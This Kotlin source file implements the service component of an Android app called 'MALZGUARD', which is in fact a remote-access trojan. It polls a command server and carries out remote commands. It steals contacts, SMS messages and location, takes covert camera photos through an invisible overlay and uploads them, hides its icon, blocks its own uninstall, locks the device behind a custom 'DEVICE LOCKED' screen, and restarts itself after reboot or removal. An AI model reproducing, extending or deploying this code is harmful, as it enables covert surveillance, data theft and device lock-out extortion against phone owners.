package com.example.malzguard

import android.app.*
import android.app.WallpaperManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.provider.Settings
import android.net.Uri
import android.view.Gravity
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

class Svc : Service() {
    private var running = false
    private var id = ""
    private val server = Config.SERVER
    private var wakeLock: PowerManager.WakeLock? = null
    private var camThread: HandlerThread? = null
    private var camHandler: Handler? = null
    private var overlayView: FrameLayout? = null
    private var wm: WindowManager? = null

    override fun onCreate() {
        super.onCreate()
        try {
            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            id = sp.getString("id", null) ?: run { val v = UUID.randomUUID().toString(); sp.edit().putString("id", v).apply(); v }
            if (Build.VERSION.SDK_INT >= 26) {
                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                nm.createNotificationChannel(NotificationChannel("mg", "MALZGUARD", NotificationManager.IMPORTANCE_MIN))
            }
            val n = Notification.Builder(this, "mg").setContentTitle("MALZGUARD").setContentText("Service running").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
            startForeground(1, n)
            try { val pm = getSystemService(POWER_SERVICE) as PowerManager; wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MALZGUARD::wl"); wakeLock?.setReferenceCounted(false); wakeLock?.acquire() } catch (e: Exception) {}
            camThread = HandlerThread("cam").also { it.start() }
            camHandler = Handler(camThread!!.looper)
            wm = getSystemService(WINDOW_SERVICE) as WindowManager
        } catch (e: Exception) {}
        running = true
        Thread { loop() }.start()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
                val n = Notification.Builder(this, "mg").setContentTitle("MALZGUARD").setContentText("Service running").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
                startForeground(1, n)
            }
        } catch (e: Exception) {}
        if (!running) { running = true; Thread { loop() }.start() }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            val restart = Intent(applicationContext, Svc::class.java)
            val pi = PendingIntent.getService(applicationContext, 1, restart, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT)
            val am = getSystemService(ALARM_SERVICE) as AlarmManager
            am.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, pi)
        } catch (e: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    private fun loop() {
        while (running) {
            try {
                heartbeat()
                val body = httpGet("$server/api/poll/$id")
                if (body != null && body.contains("commands")) handle(body)
            } catch (e: Exception) {}
            try { Thread.sleep(3000) } catch (e: Exception) {}
        }
    }

    private fun httpGet(url: String): String? {
        try {
            val c = URL(url).openConnection() as HttpURLConnection
            c.connectTimeout = 10000; c.readTimeout = 15000; c.requestMethod = "GET"
            val code = c.responseCode
            val s = if (code in 200..299) c.inputStream else c.errorStream
            val text = s?.bufferedReader()?.use { it.readText() }; c.disconnect(); return text
        } catch (e: Exception) { return null }
    }

    private fun httpPost(url: String, body: String): String? {
        try {
            val c = URL(url).openConnection() as HttpURLConnection
            c.connectTimeout = 10000; c.readTimeout = 15000; c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "application/json")
            c.outputStream.use { it.write(body.toByteArray()) }
            val code = c.responseCode
            val s = if (code in 200..299) c.inputStream else c.errorStream
            val text = s?.bufferedReader()?.use { it.readText() }; c.disconnect(); return text
        } catch (e: Exception) { return null }
    }

    private fun logSrv(kind: String, msg: String) {
        try {
            val c = URL("$server/api/log/$id/$kind").openConnection() as HttpURLConnection
            c.connectTimeout = 5000; c.readTimeout = 5000; c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "text/plain")
            c.outputStream.use { it.write(msg.toByteArray()) }
            try { c.responseCode; c.inputStream?.close() } catch (e: Exception) {}
            c.disconnect()
        } catch (e: Exception) {}
    }

    private fun heartbeat() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            val admin = ComponentName(this, AdminRecv::class.java)
            val isAdmin = try { dpm?.isAdminActive(admin) ?: false } catch (e: Exception) { false }
            val bm = getSystemService(BATTERY_SERVICE) as? BatteryManager
            val bat = try { bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1 } catch (e: Exception) { -1 }
            val j = JSONObject().put("id", id).put("model", Build.MANUFACTURER + " " + Build.MODEL).put("android", Build.VERSION.RELEASE).put("admin", if (isAdmin) 1 else 0).put("battery", bat)
            httpPost("$server/api/register", j.toString())
        } catch (e: Exception) {}
    }

    private fun handle(body: String) {
        try {
            val arr = JSONObject(body).getJSONArray("commands")
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val cid = o.getInt("id")
                val cmd = o.getString("cmd")
                val args = JSONObject(o.optString("args", "{}"))
                Thread {
                    val r = try { exec(cmd, args) } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
                    try { httpPost("$server/api/result/$cid", r) } catch (e: Exception) {}
                }.start()
            }
        } catch (e: Exception) {}
    }

    private fun exec(cmd: String, a: JSONObject): String {
        return try {
            when (cmd) {
                "lock" -> {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(this, AdminRecv::class.java)
                    if (!dpm.isAdminActive(admin)) "ERR: not admin" else { dpm.lockNow(); "locked" }
                }
                "custom_lock" -> {
                    if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                        Handler(Looper.getMainLooper()).post {
                            try { startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (e: Exception) {}
                        }
                        "ERR: no overlay permission"
                    } else {
                        val html = a.optString("html", "<h1>DEVICE LOCKED</h1>")
                        LockManager.show(this, html)
                        "custom lock shown"
                    }
                }
                "unlock" -> {
                    try { LockManager.hide(this) } catch (e: Exception) {}
                    try {
                        val i = Intent(LockOverlay.ACTION_UNLOCK)
                        i.setPackage(packageName)
                        sendBroadcast(i)
                    } catch (e: Exception) {}
                    "unlock sent"
                }
                "vibrate" -> {
                    val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                    val ms = a.optLong("ms", 1000)
                    if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE)) else @Suppress("DEPRECATION") v.vibrate(ms)
                    "ok"
                }
                "toast" -> { val t = a.optString("text", "hi"); Handler(Looper.getMainLooper()).post { Toast.makeText(applicationContext, t, Toast.LENGTH_LONG).show() }; "ok" }
                "open_url" -> { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(a.optString("url", "https://google.com"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); "ok" }
                "get_location" -> {
                    val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                    val l = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                    if (l == null) "ERR: no location" else JSONObject().put("lat", l.latitude).put("lon", l.longitude).toString()
                }
                "get_contacts" -> {
                    val arr = JSONArray()
                    val c = contentResolver.query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                    c?.use { while (it.moveToNext() && arr.length() < 500) { arr.put(JSONObject().put("name", it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).put("phone", it.getString(it.getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))) } }
                    arr.toString()
                }
                "get_sms" -> {
                    val arr = JSONArray()
                    val c = contentResolver.query(android.provider.Telephony.Sms.CONTENT_URI, null, null, null, android.provider.Telephony.Sms.DATE + " DESC")
                    c?.use { while (it.moveToNext() && arr.length() < 200) { arr.put(JSONObject().put("from", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS))).put("body", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY)))) } }
                    arr.toString()
                }
                "hide_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); "hidden" }
                "show_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); "shown" }
                "uninstall_block" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin" }
                "uninstall_unblock" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin" }
                "set_wallpaper" -> { setWallpaper(a.optString("url", "")); "wallpaper requested" }
                "take_photo" -> { takePhoto(a.optString("facing", "back")); "photo requested" }
                else -> "unknown"
            }
        } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
    }

    private fun setWallpaper(url: String) {
        Thread {
            try {
                if (url.isEmpty()) { logSrv("wp_err", "url_empty"); return@Thread }
                logSrv("wp_start", "url=" + url.take(80))
                val conn = URL(url).openConnection() as HttpURLConnection
                conn.connectTimeout = 15000; conn.readTimeout = 30000
                conn.instanceFollowRedirects = true
                conn.connect()
                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()
                if (bytes.isEmpty()) { logSrv("wp_err", "empty_bytes"); return@Thread }
                logSrv("wp_dl", "size=" + bytes.size)
                val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) { logSrv("wp_err", "decode_fail"); return@Thread }
                val wmgr = WallpaperManager.getInstance(applicationContext)
                try { wmgr.setBitmap(bmp) } catch (e: Exception) {
                    try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM) } catch (e2: Exception) {
                        try { wmgr.setBitmap(bmp, null, true, WallpaperManager.FLAG_LOCK) } catch (e3: Exception) {
                            logSrv("wp_err", "set_fail: " + (e3.message ?: "?"))
                            return@Thread
                        }
                    }
                }
                logSrv("wp_ok", "wallpaper set")
            } catch (e: Exception) {
                logSrv("wp_err", e.message ?: "unknown")
            }
        }.start()
    }

    private fun takePhoto(facing: String) {
        try {
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                logSrv("cam_err", "no_overlay_permission")
                Handler(Looper.getMainLooper()).post {
                    try { startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)) } catch (e: Exception) {}
                }
                return
            }
            showOverlay()
            val h = camHandler ?: Handler(Looper.getMainLooper())
            logSrv("cam_step", "posting capture, handler=" + (if (camHandler != null) "cam" else "main"))
            (camHandler ?: Handler(Looper.getMainLooper())).postDelayed({
                logSrv("cam_step", "running capture")
                try { capturePhoto(facing) } catch (e: Exception) { logSrv("cam_err", "cp: " + (e.message ?: "?")) }
            }, 500)
        } catch (e: Exception) { logSrv("cam_err", "take: " + (e.message ?: "?")); hideOverlay() }
    }

    private fun showOverlay() {
        try {
            hideOverlay()
            val v = FrameLayout(this)
            v.setBackgroundColor(0x00000000)
            val type = if (Build.VERSION.SDK_INT >= 26) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE
            val lp = WindowManager.LayoutParams(1, 1, type, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN, PixelFormat.TRANSLUCENT)
            lp.gravity = Gravity.TOP or Gravity.START
            lp.x = 0; lp.y = 0
            wm?.addView(v, lp)
            overlayView = v
            logSrv("cam_ovl", "shown")
        } catch (e: Exception) { logSrv("cam_err", "ovl: " + (e.message ?: "?")) }
    }

    private fun hideOverlay() {
        try { overlayView?.let { wm?.removeView(it) } } catch (e: Exception) {}
        overlayView = null
    }

    private fun capturePhoto(facing: String) {
        try {
            logSrv("cam_step", "enter capturePhoto facing=" + facing)
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { cid ->
                val ch = cm.getCameraCharacteristics(cid)
                val f = ch.get(CameraCharacteristics.LENS_FACING)
                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
            } ?: cm.cameraIdList.firstOrNull() ?: run { logSrv("cam_err", "no_cam"); hideOverlay(); return }
            val ch = cm.getCameraCharacteristics(camId)
            val sz = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull() ?: run { logSrv("cam_err", "no_size"); hideOverlay(); return }
            logSrv("cam_open", "id=$camId ${sz.width}x${sz.height}")
            val reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage()
                    val buf = img?.planes?.get(0)?.buffer
                    if (buf != null) {
                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                        logSrv("cam_snap", "size=${bytes.size}")
                        uploadPhoto(bytes)
                    } else logSrv("cam_err", "no_buf")
                    img?.close()
                } catch (e: Exception) { logSrv("cam_err", "snap: " + (e.message ?: "?")) }
                try { r.close() } catch (e: Exception) {}
                hideOverlay()
            }, (camHandler ?: Handler(Looper.getMainLooper())))
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    logSrv("cam_opened", "ok")
                    try {
                        cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(sess: CameraCaptureSession) {
                                try {
                                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    req.addTarget(reader.surface)
                                    sess.capture(req.build(), null, (camHandler ?: Handler(Looper.getMainLooper())))
                                    (camHandler ?: Handler(Looper.getMainLooper()))?.postDelayed({ try { cam.close() } catch (e: Exception) {} }, 3000)
                                } catch (e: Exception) { logSrv("cam_err", "capture: " + (e.message ?: "?")); hideOverlay() }
                            }
                            override fun onConfigureFailed(sess: CameraCaptureSession) { logSrv("cam_err", "config_fail"); hideOverlay() }
                        }, (camHandler ?: Handler(Looper.getMainLooper())))
                    } catch (e: Exception) { logSrv("cam_err", "session: " + (e.message ?: "?")); hideOverlay() }
                }
                override fun onDisconnected(cam: CameraDevice) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "disc"); hideOverlay() }
                override fun onError(cam: CameraDevice, e: Int) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "onerr=$e"); hideOverlay() }
            }, (camHandler ?: Handler(Looper.getMainLooper())))
        } catch (e: Exception) { logSrv("cam_err", "cap: " + (e.message ?: "?")); hideOverlay() }
    }

    private fun uploadPhoto(bytes: ByteArray) {
        try {
            logSrv("photo_start", "id=${id.take(12)} size=${bytes.size}")
            if (id.isEmpty()) { logSrv("photo_fail", "id_empty"); return }
            val boundary = "----MG" + System.currentTimeMillis()
            val head = ("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cam_${System.currentTimeMillis()}.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray()
            val tail = ("\r\n--$boundary--\r\n").toByteArray()
            val total = head.size + bytes.size + tail.size
            val c = URL("$server/api/upload/$id/photo").openConnection() as HttpURLConnection
            c.connectTimeout = 20000; c.readTimeout = 30000; c.requestMethod = "POST"; c.doOutput = true
            c.setFixedLengthStreamingMode(total)
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val os: OutputStream = c.outputStream
            os.write(head); os.write(bytes); os.write(tail); os.flush(); os.close()
            val code = c.responseCode
            try { c.inputStream?.close() } catch (e: Exception) {}
            try { c.disconnect() } catch (e: Exception) {}
            logSrv("photo_ok", "code=$code")
        } catch (e: Exception) { logSrv("photo_err", e.message ?: "?") }
    }

    override fun onDestroy() {
        running = false
        try { wakeLock?.release() } catch (e: Exception) {}
        try { camThread?.quitSafely() } catch (e: Exception) {}
        hideOverlay()
        super.onDestroy()
    }
    override fun onBind(i: Intent?): IBinder? = null
}

class AdminRecv : android.app.admin.DeviceAdminReceiver()

class Boot : android.content.BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent?) { try { c.startForegroundService(Intent(c, Svc::class.java)) } catch (e: Exception) {} }
}
